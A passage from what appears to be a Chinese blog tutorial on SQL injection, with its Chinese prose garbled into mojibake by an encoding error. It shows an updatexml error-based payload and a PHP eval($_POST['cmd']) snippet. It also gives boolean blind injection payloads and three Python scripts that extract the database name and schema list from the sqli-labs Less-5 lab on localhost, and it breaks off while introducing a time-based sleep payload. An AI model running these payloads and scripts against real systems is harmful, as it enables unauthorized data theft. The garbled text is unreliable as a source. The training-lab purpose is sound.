title="æ€»ç»“"></a>æ€»ç»“</h5><p>æˆ‘ä»¬ä¹Ÿæ¥å°æ€»ç»“ä¸€ä¸‹å †å æ³¨å…¥ï¼šä¼˜ç‚¹å½“ç„¶å°±æ˜¯æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°æ‰§è¡Œå¤šæ¡ <code>sql</code> è¯­å¥ï¼Œä½†æ˜¯è¦æ±‚è¦å›æ˜¾æ‰€æœ‰çš„ç»“æœé›†ï¼Œå¦åˆ™å¾ˆå¤šä¿¡æ¯éƒ½æ˜¯æš´ä¸å‡ºæ¥çš„ã€‚å¦‚æœä½ åœ¨æ™®é€šçš„é¢˜ç›®ä¸Šä½¿ç”¨å †å æ³¨å…¥ï¼Œé‚£ä¹ˆå‰é¢é‚£ä¸ª <code>select</code> å°±ç®—æ˜¯ç©ºé›†é‚£å®ƒä¹Ÿä¸ä¼šè¿”å›ç¬¬äºŒä¸ªç»“æœé›†çš„å†…å®¹ï¼Œæ‰€ä»¥è¿™ä¹Ÿæˆä¸ºäº†å †å æ³¨å…¥çš„å±€é™æ€§ã€‚</p><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><p>åˆ©ç”¨ä¸€äº›å‡½æ•°çš„ç‰¹æ€§ï¼Œé€šè¿‡å®ƒä»¬çš„æŠ¥é”™æŠŠä¿¡æ¯æ³„éœ²å‡ºæ¥ï¼Œå½“ç„¶å‰ææ˜¯ä½ å¯ä»¥çœ‹åˆ°å®ƒæŠ¥é”™ã€‚</p><p>æˆ‘ä»¬å‰é¢ä»‹ç»çš„æœ‰å…³ <code>xml</code> çš„å‡½æ•°éƒ½æ˜¯æŠ¥é”™æ³¨å…¥å¸¸ç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ª <code>updatexml</code> ã€‚è‡³äºæŠ¥é”™æ³¨å…¥æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘æ¥æ‰“ä¸ªæ¯”æ–¹ï¼Œæœ‰ä»¥ä¸‹ç¨‹åºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å·²çŸ¥åŒ…å«çš„æ–‡ä»¶æ˜¯ä¸€ä¸ª <code>$flag</code> å˜é‡ï¼Œæ ‡å‡†è¾“å‡ºæµå…³é—­çš„æƒ…å†µä¸‹å¦‚ä½•çŸ¥é“ <code>flag</code> çš„å€¼ï¼Ÿè¿™ä¹ˆè¯´å§ï¼Œæˆ‘ä»¬å¹³æ—¶çš„ä¸€åˆ‡æ­£å¸¸è¾“å‡ºéƒ½æ˜¯æ ‡å‡†è¾“å‡ºæµæ‰“å°å‡ºæ¥çš„ã€‚åªæœ‰æŠ¥é”™ä¿¡æ¯æ˜¯æ ‡å‡†é”™è¯¯æµæ‰“å°çš„ï¼Œå¦‚æœè¿™é‡Œå¼ºåˆ¶è®©æˆ‘åˆ©ç”¨é”™è¯¯æµè¾“å‡ºï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥é€‰æ‹© <code>rm($flag)</code>ã€‚å½“å®ƒæ‰§è¡Œçš„æ—¶å€™è¿™ä¸ªå‡½æ•°å°±ä¼šæŠ¥é”™ <code>xxx not found</code>ï¼Œè¿™ä¸ªä¼šé€šè¿‡é”™è¯¯æµæ‰“å°ï¼Œè€Œè¿™é‡Œçš„ <code>xxx</code> å°±æ˜¯ <code>$flag</code> å˜é‡çš„å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼šè®©å…³é”®ä¿¡æ¯æ‰§è¡Œï¼Œç„¶åé€šè¿‡æŠ¥é”™ä½¿å¾—æ‰“å°è¿™ä¸ªå…³é”®çš„ä¿¡æ¯ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å¯èƒ½å°±æ˜¯è®©å®ƒæ‰“å°å‡º <code>$flag not found</code>ï¼Œè¿™é‡Œçš„ <code>$flag</code> å¿…é¡»è¢«è§£ææ‰§è¡Œæˆå®ƒé‡Œé¢çš„å†…å®¹æ‰æ˜¯å¯¹æˆ‘ä»¬æœ‰ç”¨çš„ã€‚</p><p>åœ¨æœ‰äº›æƒ…å†µä¸‹ï¼Œå®ƒæ ‡å‡†è¾“å‡ºæµå¹¶ä¸èƒ½ç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆå›æ˜¾çš„åœ°æ–¹ï¼Œæ¯”å¦‚å¸¸è§çš„ç›²æ³¨ï¼Œå®ƒæ ‡å‡†è¾“å‡ºæµåªä¼šæ‰“å° <code>You are in</code> æˆ–è€… <code>You are not in</code>ã€‚è¿™é‡Œå¦‚æœå®ƒæ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥å»æ³„éœ²ä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬çœ‹çœ‹ç¬¬ä¸€ä¸ªå‡½æ•°ï¼š<code>updatexml(xml,find,replacement)</code>å°±æ˜¯ä¸€ä¸ª  <code>xml</code> æ›¿æ¢çš„å‡½æ•°ï¼Œè¿™é‡Œä¸­é—´çš„ <code>find</code> å‚æ•°å¿…é¡»ä½¿ç”¨ <code>Xpath</code> æ ¼å¼ï¼Œå¦åˆ™ä¼šæŠ¥é”™å¹¶ä½¿ç”¨æ ‡å‡†é”™è¯¯æµæ‰“å°ç¬¬äºŒä¸ªå‚æ•°ã€‚</p><p>æˆ‘ä»¬æ¥è¯•è¯•çœ‹ï¼šä½¿ç”¨å¦‚ä¸‹å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,user(),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/25.png" alt="25"></p><p>å¯ä»¥çœ‹åˆ°è™½ç„¶æç¤ºé”™è¯¯ï¼Œä½†æ˜¯è¿˜æ˜¯æˆåŠŸæ‰“å°äº†æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼Œèƒ½æŠ¥é”™æ³¨å…¥çš„å‡½æ•°æœ‰å¾ˆå¤šï¼ŒæŠ¥é”™æ³¨å…¥ä¹Ÿä¸è¿‡å¤šæ¼”ç¤ºäº†ã€‚</p><h5 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æŠ¥é”™æ³¨å…¥åˆ©ç”¨æ¡ä»¶å’Œè”åˆæŸ¥è¯¢æ³¨å…¥å·®ä¸å¤šï¼ŒæŠ¥é”™æ³¨å…¥éœ€è¦èƒ½çœ‹åˆ°æŠ¥é”™ä¿¡æ¯ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯ä¸€ä¸ªå›æ˜¾çš„ç‚¹ï¼Œæœ‰ä¹‹åå°±è·Ÿè”åˆæŸ¥è¯¢æ³¨å…¥å·®ä¸å¤šäº†ï¼ŒæŠŠ <code>updatexml</code> å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ›¿æ¢æˆè‡ªå·±æƒ³çŸ¥é“çš„ä¸œè¥¿ã€‚</p><h4 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h4><p>å’•å’•å’•</p><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>æ— å›æ˜¾çš„æ³¨å…¥åˆç§°ä¸ºç›²æ³¨ã€‚å¦‚æœæ— å›æ˜¾æˆ–è€…å›æ˜¾çš„å†…å®¹å’Œæ•°æ®åº“çš„å†…å®¹æ²¡æœ‰ç›´æ¥å…³ç³»ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªèƒ½é‡‡ç”¨ç›²æ³¨çš„æ‰‹æ®µã€‚ç›²æ³¨æ ¹æ®åˆ©ç”¨æ‰‹æ³•çš„ä¸åŒåˆåˆ†ä¸ºä»¥ä¸‹ä¸¤ç§</p><ol><li>å¸ƒå°”ç›²æ³¨ï¼šå¦‚æœç½‘ç«™æ ¹æ®æœ‰æ— æŸ¥æ‰¾æˆåŠŸï¼Œç»™ä½ è¿”å›çš„æœ‰ä¸”ä»…æœ‰ä¸¤ä¸ªç»“æœã€‚æˆ‘ä»¬çš„åšæ³•ä¸€èˆ¬æ˜¯ï¼Œè®©å‰é¢ <code>where</code> çš„æ¡ä»¶æ’ä¸ºå‡ï¼Œå† <code>or</code> ä¸€ä¸ªè‡ªå·±è¦åˆ¤æ–­çš„è¯­å¥ã€‚æˆ–è€…è®©å‰é¢æ’ä¸ºçœŸï¼Œå† <code>and</code> ä¸€ä¸ªæˆ‘ä»¬è¦åˆ¤æ–­çš„ç»“æœï¼Œè¿™æ ·çš„è¯åˆ¤æ–­çš„å°±æ˜¯æˆ‘ä»¬æƒ³çŸ¥é“çš„ç»“æœäº†ã€‚</li><li>æ—¶é—´ç›²æ³¨ï¼šä½¿ç”¨ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œå† <code>and</code> æˆ– <code>or</code> ä¸€ä¸ª <code>sleep</code> å‡½æ•°ï¼Œæ ¹æ®æ˜¯å¦ä¼‘çœ åˆ¤æ–­æ¡ä»¶æ˜¯å¦ä¸ºçœŸã€‚</li><li>DNSlogç›²æ³¨ï¼šå½“ç›®æ ‡ä¸èƒ½æ‰“å°ä»»ä½•æ•°æ®åº“ä¿¡æ¯ï¼Œä½†æ˜¯å¯ä»¥å‘èµ·DNSè¯·æ±‚çš„æ—¶å€™å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹å¼ï¼Œè¿™ä¸ªè®²é“ç†ä¸èƒ½å«ç›²æ³¨äº†ï¼Œå› ä¸ºå®ƒèƒ½å›æ˜¾æ•°æ®ã€‚</li></ol><p>ç›²æ³¨çš„ç‰¹ç‚¹å°±æ˜¯ï¼Œæˆ‘ä¸€æ¬¡æ‰“è¿‡å»æˆ‘æœ€å¤šçŸ¥é“ <code>1bit</code> çš„æ•°æ®ï¼Œæ‰€ä»¥ç›²æ³¨æ‰‹æ‰“æ˜¯éå¸¸è€—æ—¶çš„ï¼Œä¸‹é¢æˆ‘å°†æ¼”ç¤ºæ‰‹æ‰“å’Œå†™è„šæœ¬æ‰“ã€‚è™½ç„¶åœ¨æŸäº›æ—¶å€™ <code>sqlmap</code> æœ‰å¥‡æ•ˆï¼Œä½†æ˜¯ä½ å¾—æƒ³è¿‡ï¼Œå‡ºé¢˜äººä¸å¯èƒ½ä¼šå‡ºä¸€é“ <code>sqlmap</code> èƒ½ç›´æ¥è·‘å‡ºç­”æ¡ˆçš„é¢˜ç›®ï¼Œæ‰€ä»¥çœŸæå®æ–™è¿˜å¾—è‡ªå·±å­¦ä¼šã€‚</p><h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><p>æˆ‘ä»¬æ‰“å¼€ <code>sqli-labs-lesson5</code>ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/26.png" alt="26"></p><p>å¯ä»¥çœ‹åˆ°å®ƒè¿™é‡Œåªå›æ˜¾äº† <code>You are in</code>ï¼Œå°±å¥½æ¯”ï¼Œä½ ç™»é™†æˆåŠŸäº†ï¼Œä¸Šé¢ä¸æ˜¾ç¤ºä½ çš„ç”¨æˆ·åï¼Œåªæ˜¯å‘Šè¯‰äº†ä½ ç™»å½•æˆåŠŸï¼Œå¦åˆ™æç¤ºä½ è´¦å·æˆ–è€…å¯†ç é”™è¯¯ã€‚è™½ç„¶æŠ¥é”™æœ‰æç¤ºï¼Œä½†æ˜¯æˆ‘ä»¬ä¸ç”¨ï¼Œä¸»è¦ä½¿ç”¨ç›²æ³¨æ¥è§£å†³ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æƒ³çŸ¥é“æœ‰ä»€ä¹ˆæ•°æ®åº“ï¼Œæˆ‘ä»¬å°±è±¡å¾æ€§æ‰“ä¸€ä¸ªæ•°æ®åº“ <code>security</code> ä¸‹æ¥å§ï¼Œé€šè¿‡ç›²æ³¨çš„æ–¹å¼æŠŠè¿™ä¸ªæ•°æ®åº“åè·å–åˆ°ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬ç¡®å®šä¸€ä¸‹æ•°æ®åº“åå­—å¤šé•¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())&lt;5--+</span><br></pre></td></tr></table></figure><p>å°äº5å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œæˆ‘ä»¬æ¢æˆ <code>&lt;8</code>ï¼Œå‘ç°è¿˜æ˜¯æ²¡æœ‰ï¼Œå†æ¢æˆ <code>&lt;9</code> å‘ç°æœ‰ã€‚æˆ‘ä»¬å°±çŸ¥é“äº†æ•°æ®åº“åé•¿åº¦ä¸º <code>8</code> äº†ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/27.png" alt="27"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ <code>left</code> å‡½æ•°æˆªå–å­—ç¬¦ä¸²å‰ç¼€ï¼Œç„¶ååˆ¤æ–­ï¼Œæˆ‘ä»¬ä¸€ä½ä¸€ä½å¼€å§‹åˆ¤æ–­ã€‚æœ€åå‘ç° <code>left(database(),1)=&#39;s&#39;</code> è¿”å›æ­£ç¡®ç»“æœã€‚äºæ˜¯æˆ‘ä»¬çŸ¥é“äº†æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ˜¯ <code>s</code>ã€‚ç„¶åæˆ‘ä»¬åé¢å†ä¸€ç›´è¿™æ ·åˆ¤æ–­ï¼Œä¾¿èƒ½å¾ˆå¿«çŸ¥é“æ•°æ®åº“åäº†ã€‚</p><p>è¿™é‡Œä¸ºäº†æå‡è‡ªå·±ï¼Œå»ºè®®è‡ªå·±ç”¨ <code>python</code> å†™ä¸€ä¸ªè„šæœ¬æ¥è¿›è¡Œç›²æ³¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and length(database())&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27;--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"><span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹çœ‹è¿è¡Œç»“æœã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/28.png" alt="28"></p><p>ç„¶åå†™ä¸€ä¸‹è·‘æ•°æ®åº“åç§°çš„è„šæœ¬ã€‚è¿™é‡Œéœ€è¦è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨æˆªå–å­—ç¬¦çš„æ—¶å€™ä¸ºä»€ä¹ˆè¦åŠ  <code>ord</code>ï¼Œå› ä¸º <code>mysql</code> æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥ç›´æ¥å­—ç¬¦ä¸²æ¯”è¾ƒå°±å¯èƒ½å‡ºç° <code>mid(database(),1,1)&lt;&#39;T&#39;</code> ä¸º <code>true</code> ä½†æ˜¯ <code>mid(database(),1,1)&lt;&#39;s&#39;</code> ä¸º <code>false</code>ï¼Œè¿™æ˜¾ç„¶ä¸ç¬¦åˆäºŒåˆ†ç­”æ¡ˆçš„æœŸæœ›ï¼Œä¼šå¯¼è‡´ç¨‹åºæ­»æ‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and length(database())&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27;--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and ord(mid(database(),&#123;0&#125;,1))&lt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        p=get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br></pre></td></tr></table></figure><p>è·‘ä¸€ä¸‹ä¹Ÿå¯ä»¥çœ‹åˆ°ç»“æœ</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/29.png" alt="29"></p><p>ä½†æ˜¯æˆ‘ä»¬ä»ç„¶æƒ³çŸ¥é“æ‰€æœ‰æ•°æ®åº“çš„åç§°æ€ä¹ˆåŠå‘¢ï¼Ÿé‚£å°±æ”¹ä¸€ä¸‹ï¼Œç»§ç»­è·‘ï¼Œå°±æ˜¯ä¼šæ…¢ä¸€ç‚¹ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ä¸€ä¸ªå˜é‡ç»Ÿè®¡ä¸€ä¸‹çœ‹çœ‹å®ƒä¸€å…±è¯·æ±‚äº†å¤šå°‘æ¬¡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and (select length(group_concat(schema_name))&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27; from information_schema.schemata)--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and (select ord(mid(group_concat(schema_name),&#123;0&#125;,1))&lt;&#123;1&#125; from information_schema.schemata);--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        p=get(url)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/30.png" alt="30"></p><p>å¯ä»¥çœ‹åˆ°æ³¨å‡ºè¿™äº›æ•°æ®åº“ä¸€å…±è¯·æ±‚äº† <code>758</code> æ¬¡ï¼Œè€Œä¸”äºŒåˆ†ç®—æ˜¯æ•ˆç‡æ¯”è¾ƒé«˜çš„äº†ï¼Œä¹Ÿè®¸ä½ ä¼šè¯´æˆ‘å†™çš„ä¹Ÿæœ‰é—®é¢˜ï¼ŒèŒƒå›´åº”è¯¥é™å®šåœ¨ <code>33-127</code>ï¼Œä½†æ˜¯å¯¹äºäºŒåˆ†æ¥è¯´ï¼ŒèŒƒå›´ç¼©å°ä¸€åŠä¹Ÿåªæ˜¯å°‘è¯·æ±‚ä¸€æ¬¡è€Œå·²ï¼Œæ•´ä¸ªä¿¡æ¯é•¿åº¦ <code>94</code>ï¼Œæˆ‘ä»¬ç†è®ºä¸Šä¹Ÿå°±ä¼šå°‘è¯·æ±‚äº† <code>94</code> æ¬¡ã€‚åœ¨ç»è¿‡å®é™…æµ‹é‡ä¹‹åï¼Œå‘ç°ä¹Ÿæ˜¯è¦è¯·æ±‚ <code>632</code> æ¬¡çš„ï¼Œæ‰€ä»¥ç›²æ³¨æ˜¯ä¸å¯èƒ½å»æ‰‹æ‰“çš„ï¼Œä¸€å®šè¦å­¦ä¼šè‡ªå·±å†™è„šæœ¬è·‘ï¼Œè‡ªå·±ä¼šå†™èƒ½åº”å¯¹ä»»ä½•æƒ…å†µï¼Œè€Œä½ å¦‚æœä¸€å‘³çš„ä¾é  <code>sqlmap</code> æœ€ç»ˆä¼šå‘ç°åƒäºçš„è¿˜æ˜¯è‡ªå·±ã€‚</p><p>å¸ƒå°”ç›²æ³¨ä¸€èˆ¬åº”ç”¨åœ¨é¡µé¢æ— æœ‰å…³æ•°æ®åº“å†…å®¹çš„å›æ˜¾ï¼ŒæŠ¥é”™ä¹Ÿæ— æç¤ºï¼Œå¹¶ä¸”åªæœ‰ä¸¤ç§å›æ˜¾çš„ç»“æœçš„æ—¶å€™ç”¨çš„ã€‚æ¯”è¾ƒä¸‡é‡‘æ²¹ï¼Œä½†æ˜¯ä¼šå¯¼è‡´è¯·æ±‚é‡å¾ˆå¤§ï¼Œå®é™…åº”ç”¨çš„æ—¶å€™å¦‚æœé™åˆ¶è¯·æ±‚æ¬¡æ•°é‚£ä¹ˆä¼šå¾ˆéš¾ã€‚</p><p>åŸºäºæ—¶é—´çš„ç›²æ³¨</p><p>è¿™ä¸ªå¯ä»¥è¯´æ˜¯æœ€åçš„æ³•å®äº†ï¼Œå› ä¸ºå®ƒä½¿ç”¨æ‰€æœ‰çš„å¸¦æœ‰æ³¨å…¥çš„é¡µé¢ã€‚å¦‚æœä½ çš„æŸ¥è¯¢è¯·æ±‚ç”šè‡³ä¸ä¼šæœ‰ä¸€ç‚¹ç‚¹çš„å›æ˜¾ï¼Œæ¯”å¦‚è¯´ç™»å½•çš„æ—¶å€™éƒ½ä¸å‘Šè¯‰ä½ ç™»å½•æˆåŠŸæˆ–è€…è´¦å·å¯†ç å¤±è´¥ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±åªèƒ½ä½¿ç”¨åŸºäºæ—¶é—´çš„ç›²æ³¨äº†ã€‚</p><p>çƒ«èŠå£«ï¼šæ‰€æœ‰è¯­è¨€çš„ç‰¹æ€§â€”é€»è¾‘è¿ç®—ä¸å’Œæˆ–éƒ½æœ‰è¿™ä¹ˆä¸ªç‰¹æ€§ï¼Œä¸¤ä¸ªè¡¨è¾¾å¼ <code>and</code>ï¼Œå¦‚æœç¬¬ä¸€ä¸ªè¡¨è¾¾å¼ä¸º <code>0</code> é‚£ä¹ˆä¸ä¼šè¿ç®—ç¬¬äºŒä¸ªè¡¨è¾¾å¼ï¼Œä¸¤ä¸ªè¡¨è¾¾å¼ <code>or</code>ï¼Œå¦‚æœç¬¬ä¸€ä¸ªè¡¨è¾¾å¼ä¸º <code>1</code> é‚£ä¹ˆä¸ä¼šè®¡ç®—ç¬¬äºŒä¸ªè¡¨è¾¾å¼ï¼Œä¸¤ä¸ªè¡¨è¾¾å¼å¯ä»¥æ‰©å±•åˆ° <code>n</code> ä¸ªè¡¨è¾¾å¼ã€‚</p><p>åŸºäºæ­¤ï¼Œæˆ‘ä»¬ç»™å‡ºç¬¬ä¸€ä¸ª <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and è¡¨è¾¾å¼ and sleep(5)--+</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°è¡¨è¾¾å¼ä¸º <code>1</code> é‚£ä¹ˆä¼šæ‰§è¡Œ 